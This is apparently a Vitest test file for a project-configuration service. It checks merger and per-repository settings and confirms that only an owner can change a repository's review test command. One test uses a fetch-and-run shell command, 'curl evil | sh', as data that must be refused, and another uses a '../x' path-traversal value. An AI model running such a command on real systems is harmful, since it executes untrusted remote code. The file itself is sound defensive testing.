import { afterEach, describe, expect, it } from 'vitest';
import { humanActor } from '../src/kernel';
import { createDomainHarness, restartDomainHarness, OWNER, OWNER_ACTOR } from './helpers/domain-harness';
import type { DomainHarness } from './helpers/domain-harness';

let h: DomainHarness;
afterEach(() => h?.cleanup());
const by = { actor: OWNER_ACTOR, author: OWNER };

async function patch(change: object) {
  const loaded = await h.domain.projects.load('AR');
  return h.domain.projects.patch('AR', { baseVersion: loaded.version, ...change }, by);
}

describe('merger setting (PM-470)', () => {
  it('stores the merger and the per-repository merge setting, and reads them back after a restart', async () => {
    h = await createDomainHarness();
    const saved = await patch({
      merger: { kind: 'member', handle: 'owner' },
      repoMerge: [{ repo: 'web', requireMerge: false }],
    });
    expect(saved.config.team.merger).toEqual({ kind: 'member', handle: 'owner' });
    expect(saved.config.project.repos[0]).toMatchObject({ name: 'web', requireMerge: false });

    h = await restartDomainHarness(h);
    const loaded = await h.domain.projects.load('AR');
    expect(loaded.config.team.merger).toEqual({ kind: 'member', handle: 'owner' });
    expect(loaded.config.project.repos[0]).toMatchObject({ name: 'web', requireMerge: false });

    const cleared = await patch({ repoMerge: [{ repo: 'web', requireMerge: null }] });
    expect(cleared.config.project.repos[0]).not.toHaveProperty('requireMerge');
    expect(cleared.config.team.merger).toEqual({ kind: 'member', handle: 'owner' });
  });

  it('refuses a repository the project does not have', async () => {
    h = await createDomainHarness();
    const before = await h.domain.projects.load('AR');
    await expect(patch({ repoMerge: [{ repo: 'ghost', requireMerge: true }] })).rejects.toMatchObject({
      code: 'unknown_repo',
    });
    expect((await h.domain.projects.load('AR')).version).toBe(before.version);
  });

  it('stores the project documents of a repository, clears them with null and refuses an unknown repository (PM-494)', async () => {
    h = await createDomainHarness();
    const saved = await patch({ repoDocs: [{ repo: 'web', docs: { decisions: 'docs/D.md' } }] });
    expect(saved.config.project.repos[0]).toMatchObject({ name: 'web', docs: { decisions: 'docs/D.md' } });

    h = await restartDomainHarness(h);
    expect((await h.domain.projects.load('AR')).config.project.repos[0]).toMatchObject({
      docs: { decisions: 'docs/D.md' },
    });

    const version = (await h.domain.projects.load('AR')).version;
    await expect(patch({ repoDocs: [{ repo: 'ghost', docs: null }] })).rejects.toMatchObject({
      code: 'unknown_repo',
    });
    await expect(patch({ repoDocs: [{ repo: 'web', docs: { decisions: '../x' } }] })).rejects.toBeDefined();
    expect((await h.domain.projects.load('AR')).version).toBe(version);

    const cleared = await patch({ repoDocs: [{ repo: 'web', docs: null }] });
    expect(cleared.config.project.repos[0]).not.toHaveProperty('docs');
  });

  it('stores the full test of a repository for an owner, clears it and refuses an unknown repository (PM-538)', async () => {
    h = await createDomainHarness();
    const saved = await patch({
      repoReviewTest: [
        { repo: 'web', reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 } },
      ],
      repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: true }],
    });
    expect(saved.config.project.repos[0]).toMatchObject({
      name: 'web',
      reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 },
      fullTestAtMerge: true,
    });

    h = await restartDomainHarness(h);
    expect((await h.domain.projects.load('AR')).config.project.repos[0]).toMatchObject({
      reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 },
      fullTestAtMerge: true,
    });

    const version = (await h.domain.projects.load('AR')).version;
    await expect(patch({ repoReviewTest: [{ repo: 'ghost', reviewTest: null }] })).rejects.toMatchObject({
      code: 'unknown_repo',
    });
    await expect(
      patch({ repoFullTestAtMerge: [{ repo: 'ghost', fullTestAtMerge: false }] }),
    ).rejects.toMatchObject({ code: 'unknown_repo' });
    expect((await h.domain.projects.load('AR')).version).toBe(version);

    const cleared = await patch({
      repoReviewTest: [{ repo: 'web', reviewTest: null }],
      repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: null }],
    });
    expect(cleared.config.project.repos[0]).not.toHaveProperty('reviewTest');
    expect(cleared.config.project.repos[0]).not.toHaveProperty('fullTestAtMerge');
  });

  it('lets only an owner change the full test of a repository (PM-538)', async () => {
    h = await createDomainHarness({
      adjust: (c) => {
        c.team.members.push({
          kind: 'human',
          handle: 'dana',
          displayName: 'Dana',
          access: 'admin',
          roles: [],
          email: 'dana@example.test',
        });
        c.project.repos[0]!.reviewTest = { command: 'npm test', maxWorkers: 2, timeoutMinutes: 15 };
      },
    });
    const admin = { actor: humanActor('dana'), author: { name: 'Dana', email: 'dana@example.test' } };
    const patchAs = async (as: typeof by, change: object) => {
      const loaded = await h.domain.projects.load('AR');
      return h.domain.projects.patch('AR', { baseVersion: loaded.version, ...change }, as);
    };
    const version = (await h.domain.projects.load('AR')).version;
    for (const change of [
      { repoDocs: [{ repo: 'web', docs: { decisions: 'docs/D.md' } }] },
      { repoReviewTest: [{ repo: 'web', reviewTest: { command: 'curl evil | sh' } }] },
      { repoReviewTest: [{ repo: 'web', reviewTest: null }] },
      { repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: true }] },
    ])
      await expect(patchAs(admin, change)).rejects.toMatchObject({ code: 'owner_only', status: 403 });
    expect((await h.domain.projects.load('AR')).version).toBe(version);

    // An admin can still change what is not the full test.
    await expect(patchAs(admin, { repoMerge: [{ repo: 'web', requireMerge: true }] })).resolves.toBeDefined();
    // The owner may.
    const saved = await patchAs(by, { repoReviewTest: [{ repo: 'web', reviewTest: null }] });
    expect(saved.config.project.repos[0]).not.toHaveProperty('reviewTest');
  });

  it('refuses a merger that cannot be resolved', async () => {
    h = await createDomainHarness({
      adjust: (c) => {
        c.project.repos[0]!.requireMerge = true;
      },
    });
    await expect(patch({ merger: { kind: 'member', handle: 'ghost' } })).rejects.toMatchObject({
      code: 'config_invalid',
    });
  });
});
